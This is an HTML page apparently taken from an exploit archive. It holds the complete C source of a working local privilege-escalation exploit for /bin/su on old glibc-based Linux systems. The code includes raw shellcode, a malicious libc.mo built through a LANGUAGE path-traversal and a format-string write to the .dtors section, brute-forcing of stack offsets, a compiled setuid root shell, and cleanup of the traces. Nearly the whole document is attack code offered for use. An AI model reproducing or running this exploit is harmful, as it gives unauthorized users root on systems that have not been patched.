<html><head><title>GLIBC (via /bin/su) Local Root Exploit
</title></head><pre>/*
 *
 *  Working exploit for glibc executing /bin/su
 *
 *  To exploit this i have used a technique that
 *  overwrites the .dtors section of /bin/su program
 *  with the address of the shellcode, so, the program
 *  executes it when main returns or exit() is called
 *
 *   Thanks a lot to rwxrwxrwx &lt;jmbr@qualys.com&gt; for
 *  explaining me this technique :)
 *
 *  The address of .dtors section can be easily obtained
 *  with objdump -h filename.
 *
 *  One the address of .dtors is known, the shellcode is
 *  pushed in a env var with a lot of nops, and the size
 *  of the &quot;piece&quot; of stack that must be &quot;eaten&quot; is calculated
 *  with a loop. At this point, we know the exact values of
 *  all parameters exept the address of the shellcode, but this
 *  value can be guessed with a little work :)
 *
 *  Tested on:       Red Hat 6.2, 6.1
 *                   SuSE 6.2
 *
 *  Thanks to Chui, aViNash, RaiSe, |CoDeX|, YbY...
 *  (y todos los que me olvido)
 *
 *
 *  Doing / localcore - doing@netsearch-ezine.com
 *
 */


#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;string.h&gt;
#include &lt;getopt.h&gt;
#include &lt;dirent.h&gt;

char *shellcode =
&quot;\x31\xc0\x83\xc0\x17\x31\xdb\xcd\x80\xeb&quot;
&quot;\x30\x5f\x31\xc9\x88\x4f\x17\x88\x4f\x1a&quot;
&quot;\x8d\x5f\x10\x89\x1f\x8d\x47\x18\x89\x47&quot;
&quot;\x04\x8d\x47\x1b\x89\x47\x08\x31\xc0\x89&quot;
&quot;\x47\x0c\x8d\x0f\x8d\x57\x0c\x83\xc0\x0b&quot;
&quot;\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8&quot;
&quot;\xcb\xff\xff\xff\x41\x41\x41\x41\x41\x41&quot;
&quot;\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41&quot;
&quot;\x2f\x62\x69\x6e\x2f\x73\x68\x30\x2d\x63&quot;
&quot;\x30&quot;
&quot;chown root /tmp/kidd0;chmod 4777 /tmp/kidd0&quot;;

char *LC_MESSAGES = &quot;/tmp/LC_MESSAGES&quot;;
int NOP_LEN = 12000;

char *msgfmt = &quot;/usr/bin/msgfmt&quot;;
char *objdump = &quot;/usr/bin/objdump&quot;;
char *language = NULL;

char *make_format_string(unsigned long, int, int);
unsigned long get_dtors_addr();
char *make_ret_str(unsigned long, int);
void calculate_eat_space(int *, int *);
void checkfor(char*);
void make_suid_shell();
void search_valid_language();

int main(int argc, char **argv)
{
  char execbuf[1024];
  unsigned long dtors_addr = 0xAABBCCDD;
  unsigned long sh_addr = 0xBFFFFFFF;
  FILE *f;
  char *env[3];
  char *args[6];
  int eat = 0, pad = 0, fd;
  char *nop_env;
  int offset = 5000;
  struct stat st;
  int pid, c;
  char randfile[1024];
  char *args2[2], opt;

  printf(&quot;glibc xploit for /bin/su - by Doing &lt;jdoing@bigfoot.com&gt;\n&quot;);
  printf(&quot;Usage: %s [options]\n&quot;, argv[0]);
  printf(&quot; -o offset [default: 5000]\n&quot;);
  printf(&quot; -n nops   [default: 12000]\n&quot;);
  printf(&quot; -m path to msgfmt [default: /usr/bin/msgfmt]\n&quot;);
  printf(&quot; -O path to objdump [default: /usr/bin/objdump]\n&quot;);
  printf(&quot; -e eat:pad set eat and pad values [default: calculate
them]\n&quot;);
  printf(&quot; -l language set language used in env var [default: search
it]\n&quot;);
  printf(&quot;Enjoy!\n\n&quot;);

  while ((opt = getopt(argc, argv, &quot;o:n:m:O:e:l:&quot;)) != EOF)
    switch(opt) {
    case 'o':
      offset = atoi(optarg);
      break;
    case 'n':
      NOP_LEN = atoi(optarg);
      break;
    case 'm':
      msgfmt = strdup(optarg);
      break;
    case 'O':
      objdump = strdup(optarg);
      break;
    case 'e':
      sscanf(optarg, &quot;%i:%i&quot;, &amp;eat, &amp;pad);
      break;
    case 'l':
      language = (char*) malloc(40 + strlen(optarg));
      if (!language) {
	printf(&quot;malloc failed\naborting\n&quot;);
	exit(0);
      }
      memset(language, 0, 40 + strlen(optarg));
      sprintf(language, &quot;LANGUAGE=%s/../../../../../../tmp&quot;, optarg);
      break;
    default:
      exit(0);
    }

  printf(&quot;Phase 1. Checking paths and write permisions\n&quot;);
  printf(&quot; Checking for %s...&quot;, msgfmt);
  checkfor(msgfmt);
  printf(&quot; Checking for %s...&quot;, objdump);
  checkfor(objdump);

  printf(&quot; Checking write permisions on /tmp...&quot;);
  if (stat(&quot;/tmp&quot;, &amp;st) &lt; 0) {
    printf(&quot;failed. cannot stat /tmp\naborting\n&quot;);
    exit(0);
  }

  if (!(st.st_mode &amp; S_IWOTH)) {
    printf(&quot;failed. /tmp it's not +w\naborting\n&quot;);
    exit(0);
  }
  printf(&quot;Ok\n&quot;);
  fflush(stdout);

  printf(&quot; Checking read permisions on /bin/su...&quot;);
  if (stat(&quot;/bin/su&quot;, &amp;st) &lt; 0) {
    printf(&quot;failed. cannot stat /bin/su\naborting\n&quot;);
    exit(0);
  }

  if (!(st.st_mode &amp; S_IROTH)) {
    printf(&quot;failed. /bin/su it's not +r\naborting\n&quot;);
    exit(0);
  }
  printf(&quot;Ok\n&quot;);
  fflush(stdout);

  if (!language) {
    printf(&quot; Checking for a valid language...&quot;);
    search_valid_language();
    printf(&quot;Ok\n&quot;);
  }

  printf(&quot; Checking that %s does not exist...&quot;, LC_MESSAGES);
  if (stat(LC_MESSAGES, &amp;st) &gt;= 0) {
    printf(&quot;failed. %s exists\naborting\n&quot;, LC_MESSAGES);
    exit(0);
  }
  printf(&quot;Ok\n&quot;);
  fflush(stdout);

  printf(&quot;Phase 2. Calculating eat and pad values\n &quot;);
  srand(time(NULL));

  if (eat || pad) printf(&quot;skkiping, values set by user to eat = %i and
pad = %i\n&quot;, eat, pad);
  else {
    calculate_eat_space(&amp;eat, &amp;pad);
    printf(&quot;done\n eat = %i and pad = %i\n&quot;, eat, pad);
  }
  fflush(stdout);

  sh_addr -= offset;

  printf(&quot;Phase 3. Creating evil libc.mo and setting enviroment
vars\n&quot;);
  fflush(stdout);

  mkdir(LC_MESSAGES, 0755);
  chdir(LC_MESSAGES);

  f = fopen(&quot;libc.po&quot;, &quot;w+&quot;);
  if (!f) {
    perror(&quot;fopen()&quot;);
    exit(0);
  }
  fprintf(f,&quot;msgid \&quot;%%s: invalid option -- %%c\\n\&quot;\n&quot;);
  fprintf(f,&quot;msgstr \&quot;%s\\n\&quot;&quot;, make_format_string(sh_addr, eat, 0));
  fclose(f);

  sprintf(execbuf, &quot;%s libc.po -o libc.mo; chmod 777 libc.mo&quot;, msgfmt);
  system(execbuf);

  nop_env = (char*) malloc(NOP_LEN + strlen(shellcode) + 1);
  if (!nop_env) {
    printf(&quot;malloc failed\naborting\n&quot;);
    exit(0);
  }
  memset(nop_env, 0x90, NOP_LEN + strlen(shellcode) + 1);
  sprintf(&amp;nop_env[NOP_LEN], &quot;%s&quot;, shellcode);

  env[0] = language;
  env[1] = NULL;

  printf(&quot;Phase 4. Getting address of .dtors section of /bin/su\n &quot;);
  dtors_addr = get_dtors_addr();
  printf(&quot;done\n .dtors is at 0x%08x\n&quot;, dtors_addr);
  fflush(stdout);

  printf(&quot;Phase 5. Compiling suid shell\n&quot;);
  fflush(stdout);

  make_suid_shell();

  printf(&quot;Phase 6. Executing /bin/su\n&quot;);
  fflush(stdout);

  args[0] = &quot;/bin/su&quot;;
  args[1] = &quot;-&quot;;
  args[2] = make_ret_str(dtors_addr, pad);
  args[3] = &quot;-w&quot;;
  args[4] = nop_env;
  args[5] = NULL;

  sprintf(randfile, &quot;/tmp/tmprand%i&quot;, rand());

  if (!(pid = fork())) {
    close(1);
    close(2);
    fd = open(randfile, O_CREAT | O_RDWR);
    dup2(fd, 1);
    dup2(fd, 2);
    execve(args[0], args, env);
    printf(&quot;failed to exec /bin/su\n&quot;); exit(0);
  }

  if (pid &lt; 0) {
    perror(&quot;fork()&quot;);
    exit(0);
  }

  waitpid(pid, &amp;c, 0);

  unlink(randfile);

  stat(&quot;/tmp/kidd0&quot;, &amp;st);
  if (!(S_ISUID &amp; st.st_mode)) {
    printf(&quot;failed to put mode 4777 to /tmp/kidd0\naborting\n&quot;);
    exit(0);
  }

  printf(&quot; - Entering rootshell ;-) -\n&quot;);
  fflush(stdout);

  if (!(pid = fork())) {
    args2[0] = &quot;/tmp/kidd0&quot;;
    args2[1] = NULL;
    execve(args2[0], args2, NULL);
    printf(&quot;failed to exec /tmp/kidd0\n&quot;);
    exit(0);
  }

  if (pid &lt; 0) {
    perror(&quot;fork()&quot;);
    exit(0);
  }

  waitpid(pid, &amp;c, 0);

  printf(&quot;Phase 7. Cleaning enviroment\n&quot;);
  sprintf(execbuf, &quot;rm -rf %s /tmp/kidd0&quot;, LC_MESSAGES);
  system(execbuf);
}

char ret_make_format[0xffff];

char *make_format_string(unsigned long sh_addr, int eat, int test)
{
  char *ret = ret_make_format;
  int c, waste;
  int hi, lo;

  memset(ret, 0, 0xffff);

  for (c = 0; c &lt; eat; c++) strcat(ret, &quot;%8x&quot;);

  waste = 8 * eat;

  hi = (sh_addr &amp; 0xffff0000) &gt;&gt; 16;
  lo = (sh_addr &amp; 0xffff) - hi;
  if (!test) {
    sprintf(&amp;ret[strlen(ret)], &quot;%%0%ux%%hn&quot;, hi-waste);
    sprintf(&amp;ret[strlen(ret)], &quot;%%0%ux%%hn&quot;, lo);
  }
  else strcat(ret, &quot;%8x *0x%08x* %8x *0x%08x*&quot;);
  return ret;
}

unsigned long get_dtors_addr()
{
  char exec_buf[1024];
  char file[128];
  char buf[1024], sect[1024];
  FILE *f;
  unsigned long ret = 0, tmp1, tmp2, tmp3;

  sprintf(file, &quot;/tmp/tmprand%i&quot;, rand());
  sprintf(exec_buf, &quot;%s -h /bin/su &gt; %s&quot;, objdump, file);

  system(exec_buf);

  f = fopen(file, &quot;r&quot;);
  if (!f) {
    perror(&quot;fopen()&quot;);
    exit(0);
  }

  while (!feof(f)) {
    fgets(buf, 1024, f);
    sscanf(buf, &quot;  %i .%s %x %x \n&quot;, &amp;tmp1, sect, &amp;tmp2, &amp;tmp3);
    printf(&quot;.&quot;); fflush(stdout);
    if (strcmp(sect, &quot;dtors&quot;)) continue;
    ret = tmp3;
    break;
  }

  unlink(file);

  if (!ret) {
    printf(&quot;error getting the address of .dtors\naborting&quot;);
    exit(0);
  }

  return ret+4;
}

char ret_make_ret_str[0xffff];

char *make_ret_str(unsigned long dtors_addr, int pad)
{
  char *ret = ret_make_ret_str, *ptr2;
  unsigned long *ptr = (unsigned long*) ret;
  int c;

  memset(ret, 0, 0xffff);

  *ptr = dtors_addr+2;
  *(ptr+1) = 0xAABBCCDD;
  *(ptr+2) = dtors_addr;

  ptr2 = &amp;ret[strlen(ret)];
  while (pad--)
    *(ptr2++) = 0xaa;

  return ret;
}

void calculate_eat_space(int *eatr, int *padr)
{
  int eat = 0, pad = 0;
  char tmpfile[128];
  FILE *f;
  char execbuf[1024];
  int fds[2], tmpfd;
  unsigned long test_value = 0xAABBCCDD;
  char *nop_env;
  char *env[2];
  char *args[6];
  char buf[1024];
  int l, pid;
  struct stat st;
  char *readbuf = NULL, *token;
  unsigned long t1, t2;

  tmpfile[0] = '\0';

  nop_env = (char*) malloc(NOP_LEN + strlen(shellcode) + 1);
  if (!nop_env) {
    printf(&quot;malloc failed\naborting\n&quot;);
    exit(0);
  }
  memset(nop_env, 0x90, NOP_LEN + strlen(shellcode) + 1);
  sprintf(&amp;nop_env[NOP_LEN], &quot;%s&quot;, shellcode);

  for (eat = 50; eat &lt; 200; eat++) {
    for (pad = 0; pad &lt; 4; pad++) {

      if (tmpfile[0]) unlink(tmpfile);

      chdir(&quot;/&quot;);

      sprintf(execbuf, &quot;rm -rf %s&quot;, LC_MESSAGES);
      system(execbuf);

      mkdir(LC_MESSAGES, 0755);
      chdir(LC_MESSAGES);

      f = fopen(&quot;libc.po&quot;, &quot;w+&quot;);
      if (!f) {
	perror(&quot;fopen()&quot;);
	exit(0);
      }

      fprintf(f,&quot;msgid \&quot;%%s: invalid option -- %%c\\n\&quot;\n&quot;);
      fprintf(f,&quot;msgstr \&quot;%s\\n\&quot;&quot;, make_format_string(0xbfffffbb, eat,
1));
      fclose(f);

      sprintf(execbuf, &quot;chmod 777 libc.po; %s libc.po -o libc.mo&quot;,
msgfmt);
      system(execbuf);

      pipe(&amp;fds);

      if (!(pid = fork())) {

	close(fds[0]);
	close(1);
	close(2);

	dup2(fds[1], 1);
	dup2(fds[1], 2);

	env[0] = language;
	env[1] = NULL;

	args[0] = &quot;/bin/su&quot;;
	args[1] = &quot;-&quot;;
	args[2] = make_ret_str(test_value, pad);
	args[3] = &quot;-w&quot;;
	args[4] = nop_env;
	args[5] = NULL;

	execve(args[0], args, env);
      }

      if (pid &lt; 0) {
	perror(&quot;fork()&quot;);
	exit(0);
      }

      close(fds[1]);

      sprintf(tmpfile, &quot;/tmp/tmprand%i&quot;, rand());
      tmpfd = open(tmpfile, O_RDWR | O_CREAT);
      if (tmpfd &lt; 0) {
	perror(&quot;open()&quot;);
	exit(0);
      }
      while ((l = read(fds[0], buf, 1024)) &gt; 0)
	write(tmpfd, buf, l);
      close(tmpfd);

      waitpid(pid, &amp;l, 0);

      stat(tmpfile, &amp;st);

      chmod(tmpfile, 0777);

      f = fopen(tmpfile, &quot;r&quot;);
      if (!f) {
	perror(&quot;fopen()&quot;);
	exit(0);
      }

      if (readbuf) free(readbuf);
      readbuf = (char*) malloc(st.st_size);
      if (!readbuf) {
	printf(&quot;malloc failed\naborting\n&quot;);
	exit(0);
      }

      memset(readbuf, 0, st.st_size);

      fread(readbuf, 1, st.st_size, f);
      fclose(f);

      token = strtok(readbuf, &quot;*&quot;);
      if (!token) continue;
      token = strtok(NULL, &quot;*&quot;);
      if (!token) continue;

      t1 = strtoul(token, NULL, 16);
      token = strtok(NULL, &quot;*&quot;);
      if (!token) continue;
      token = strtok(NULL, &quot;*&quot;);
      if (!token) continue;
      t2 = strtoul(token, NULL, 16);

      if (t2 == test_value)
	if (t1 == (test_value+2)) {
	  *eatr = eat;
	  *padr = pad;
	  sprintf(execbuf, &quot;rm -rf %s&quot;, LC_MESSAGES);
	  system(execbuf);
	  if (tmpfile[0]) unlink(tmpfile);
	  return;
	}

      //      sleep(10);
    }
    printf(&quot;.&quot;);
    fflush(stdout);
  }

  if (tmpfile[0]) unlink(tmpfile);
  sprintf(execbuf, &quot;rm -rf %s&quot;, LC_MESSAGES);
  system(execbuf);

  printf(&quot;failed to calculate eat and pad values. glibc patched or
invalid language?\naborting\n&quot;);
  exit(0);
}

void checkfor(char *p)
{
  int fd;
  fd = open(p, O_RDONLY);
  if (fd &lt; 0) {
    printf(&quot;failed\naborting\n&quot;);
    exit(0);
  }
  close(fd);
  printf(&quot;Ok\n&quot;);
  fflush(stdout);
}

void make_suid_shell()
{
  FILE *f;
  char execbuf[1024];

  f = fopen(&quot;/tmp/kidd0.c&quot;, &quot;w&quot;);
  if (!f) {
    printf(&quot; failed to create /tmp/kidd0.c\naborting\n&quot;);
    exit(0);
  }

  fprintf(f, &quot;int main() { setuid(0); setgid(0); system(\&quot;/bin/sh\&quot;);
}&quot;);
  fclose(f);

  sprintf(execbuf, &quot;gcc /tmp/kidd0.c -o /tmp/kidd0&quot;);
  system(execbuf);

  sprintf(execbuf, &quot;rm -f /tmp/kidd0.c&quot;);
  system(execbuf);

  f = fopen(&quot;/tmp/kidd0&quot;, &quot;r&quot;);
  if (!f) {
    printf(&quot; failed to compile /tmp/kidd0.c\naborting\n&quot;);
    exit(0);
  }
  fclose(f);

  printf(&quot; /tmp/kidd0 created Ok\n&quot;);
  fflush(stdout);
}

void search_valid_language()
{
  DIR *locale;
  struct dirent *dentry;

  locale = opendir(&quot;/usr/share/locale&quot;);
  if (!locale) {
    perror(&quot;failed to opendir /usr/share/locale&quot;);
    printf(&quot;aborting\n&quot;);
    exit(0);
  }

  while (dentry = readdir(locale)) {

    if (!strchr(dentry-&gt;d_name, '_')) continue;

    language = (char*) malloc(40 + strlen(dentry-&gt;d_name));
    if (!language) {
      printf(&quot;malloc failed\naborting\n&quot;);
      exit(0);
    }
    memset(language, 0, 40 + strlen(dentry-&gt;d_name));
    sprintf(language, &quot;LANGUAGE=%s/../../../../../../tmp&quot;,
dentry-&gt;d_name);
    closedir(locale);
    printf(&quot; [using %s] &quot;, dentry-&gt;d_name);
    return;
  }

  printf(&quot;failed to find a valid language\naborting\n&quot;);
  exit(0);
}


// milw0rm.com [2000-11-30]</pre></html>